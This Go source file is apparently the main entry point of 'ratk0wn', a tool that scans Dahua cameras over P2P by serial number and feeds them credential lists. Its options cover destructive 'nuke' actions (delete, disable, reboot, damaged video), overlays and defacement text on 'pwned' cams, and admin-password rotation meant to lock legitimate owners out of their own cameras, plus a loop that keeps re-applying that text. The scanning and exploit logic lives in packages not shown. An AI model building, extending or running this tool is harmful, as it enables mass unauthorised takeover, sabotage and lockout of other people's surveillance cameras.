package main

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/fatih/color"
	"ratkown/ratkown/config"
	"ratkown/ratkown/scan"
	"ratkown/ratkown/types"
	"ratkown/ratkown/ui"
)

var (
	colRed     = color.New(color.FgHiRed)
	colWhite   = color.New(color.FgWhite)
	colHiWhite = color.New(color.FgHiWhite)
)

func printHelp() {
	nowStr := time.Now().Format("15:04:05")
	colRed.Printf("[%s] ratk0wn ", nowStr)
	fmt.Printf("- %s\n", ui.RandomMOTD())
	colWhite.Printf("[?] ratk0wn — Dahua cameras scanner via P2P by skver303\n")
	fmt.Printf("[-i, --input] Input file or specific target(s)\n")
	fmt.Printf("Format:\n")
	fmt.Printf("XXXXXXXXXX > Prefix\n")
	fmt.Printf("XXXXXXXXXXYYYYY > S/N\n")
	fmt.Printf("serial:login:password > ready creds\n")
	fmt.Printf("[-o, --output] Output folder for results\n")
	fmt.Printf("Default > DD-MM-YYYY_HH-MM-SS\n")
	fmt.Printf("[-t, --threads] Number of threads for scanning\n")
	fmt.Printf("Default > 100\n")
	fmt.Printf("[-c, --config] Path to config file\n")
	fmt.Printf("Default > config.toml\n")
	fmt.Printf("[-s, --shuffle] Random targets order each run\n")
	fmt.Printf("[-n, --nuke] Use destructive options (requires [nuke] in config)\n")
	fmt.Printf("[--frame] Letterbox on every pwned cam (auto -n)\n")
	fmt.Printf("[--unmask] Strip all box masks (auto -n)\n")
	fmt.Printf("[--antiwhite] Unmask + restore video colors wrecked by nukes (auto -n)\n")
	fmt.Printf("[--forceosd] Rotate admin password per-serial: our OSD becomes unerasable for others\n")
	fmt.Printf("[--osd-guard] OSD watchdog: re-apply text every N seconds (default 300). Never exits.\n")
	fmt.Printf("[-d, --debug] Log everything\n")
	fmt.Printf("[-?, -h, --help] Get general help\n")
	colHiWhite.Printf("ratk0wn by skver303 · ratk0wn · t.me/ratkointernal\n")
}

func printErrorAndExit(err string) {
	colRed.Printf("[!] %s\n", err)
	os.Exit(1)
}

func isDirReadOnly(dir string) bool {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return false
	}
	tmpFile := filepath.Join(dir, ".p2pwn_tmp")
	f, err := os.Create(tmpFile)
	if err != nil {
		return os.IsPermission(err)
	}
	f.Close()
	os.Remove(tmpFile)
	return false
}

func looksLikeFilePath(input string) bool {
	if strings.ContainsAny(input, `/\`) {
		return true
	}
	dot := strings.LastIndex(input, ".")
	if dot <= 0 || dot == len(input)-1 {
		return false
	}
	ext := input[dot+1:]
	if len(ext) > 5 {
		return false
	}
	for _, r := range ext {
		isAlnum := (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9')
		if !isAlnum {
			return false
		}
	}
	return true
}

func main() {
	ui.InitConsole()
	args := os.Args[1:]

	if len(args) == 0 {
		printHelp()
		return
	}

	var input string
	var output string
	threads := 100
	configPath := "config.toml"
	debugEnabled := false
	nukeEnabled := false
	showHelp := false
	shuffleEnabled := false
	frameMode := false
	unmaskMode := false
	antiwhiteMode := false
	forceosdMode := false
	guardLoop := false
	guardInterval := 300

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch arg {
		case "-i", "--input":
			if i+1 < len(args) {
				input = args[i+1]
				i++
			}
		case "-o", "--output":
			if i+1 < len(args) {
				output = args[i+1]
				i++
			}
		case "-t", "--threads":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &threads)
				i++
			}
		case "-c", "--config":
			if i+1 < len(args) {
				configPath = args[i+1]
				i++
			}
		case "-d", "--debug":
			debugEnabled = true
		case "-n", "--nuke":
			nukeEnabled = true
		case "--frame":
			frameMode = true
		case "--unmask":
			unmaskMode = true
		case "--antiwhite":
			unmaskMode = true
			antiwhiteMode = true
		case "--forceosd":
			forceosdMode = true
		case "-s", "--shuffle":
			shuffleEnabled = true
		case "--osd-guard":
			guardLoop = true
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &guardInterval)
				i++
			}
		case "-h", "-?", "--help":
			showHelp = true
		}
	}

	if showHelp {
		printHelp()
		return
	}

	if input == "" {
		if _, err := os.Stat("creds_ready.txt"); err == nil {
			fmt.Println("[*] no args: checker mode -> creds_ready.txt")
			input = "creds_ready.txt"
		} else {
			printHelp()
			return
		}
	}

	var targets []string
	var provided []types.ProvidedCred
	inputSource := input

	addToken := func(tok string) {
		if tok == "" {
			return
		}
		if c, ok := config.ParseCredToken(tok); ok {
			provided = append(provided, c)
			targets = append(targets, c.Serial)
			return
		}
		targets = append(targets, tok)
	}

	if looksLikeFilePath(input) {
		if st, err := os.Stat(input); err != nil || st.IsDir() {
			printErrorAndExit(fmt.Sprintf("Input file not found: %s", input))
		}
	}

	if _, err := os.Stat(input); err == nil {
		content, err := os.ReadFile(input)
		if err != nil {
			printErrorAndExit(fmt.Sprintf("Cannot read input file: %s", err))
		}
		trimmed := strings.TrimSpace(string(content))
		if trimmed == "" {
			printErrorAndExit("Empty input")
		}

		for _, line := range strings.Split(trimmed, "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			for _, part := range strings.Split(line, ",") {
				addToken(strings.TrimSpace(part))
			}
		}
	} else {
		for _, part := range strings.Split(input, ",") {
			addToken(strings.TrimSpace(part))
		}
	}

	if len(targets) == 0 {
		printErrorAndExit("Empty input")
	}

	seen := make(map[string]struct{}, len(targets))
	uniq := make([]string, 0, len(targets))
	for _, t := range targets {
		if _, ok := seen[t]; ok {
			continue
		}
		seen[t] = struct{}{}
		uniq = append(uniq, t)
	}
	targets = uniq

	if shuffleEnabled {
		rand.Shuffle(len(targets), func(i, j int) {
			targets[i], targets[j] = targets[j], targets[i]
		})
	}

	if output == "" {
		output = time.Now().Format("02-01-2006_15-04-05")
	}

	if isDirReadOnly(output) {
		printErrorAndExit("Output folder is read-only")
	}

	isDefaultConfig := (configPath == "config.toml")
	cfg, err := config.LoadConfig(configPath, isDefaultConfig)
	if err != nil {
		printErrorAndExit(err.Error())
	}

	if frameMode || unmaskMode {
		nukeEnabled = true
		cfg.Nuke.Box = true
		cfg.Nuke.Delete = false
		cfg.Nuke.Disable = false
		cfg.Nuke.Video = 0
	}
	if unmaskMode {
		cfg.Nuke.BoxRects = nil
		cfg.Nuke.Reboot = false
	}
	if antiwhiteMode {
		cfg.Nuke.RestoreVideo = true
	}

	if err := ui.InitDebug(output, debugEnabled); err != nil {
		printErrorAndExit(err.Error())
	}
	defer ui.CloseDebug()

	scanner := scan.NewScanner(targets, cfg, threads, output, inputSource, nukeEnabled, provided)
	scanner.UnmaskFirst = unmaskMode
	scanner.ForceosdMode = forceosdMode
	scanner.Run()

	if guardLoop {
		round := 0
		for {
			round++
			time.Sleep(time.Duration(guardInterval) * time.Second)
			nowStr := time.Now().Format("15:04:05")
			fmt.Printf("\n[%s] OSD GUARD round %d: re-applying text to %d targets...\n", nowStr, round, len(targets))
			scanner := scan.NewScanner(targets, cfg, threads, output, inputSource, nukeEnabled, provided)
			scanner.UnmaskFirst = unmaskMode
			scanner.ForceosdMode = forceosdMode
			scanner.Run()
			fmt.Printf("[%s] OSD GUARD round %d done. next in %ds (Ctrl+C to stop)\n",
				time.Now().Format("15:04:05"), round, guardInterval)
		}
	}
}
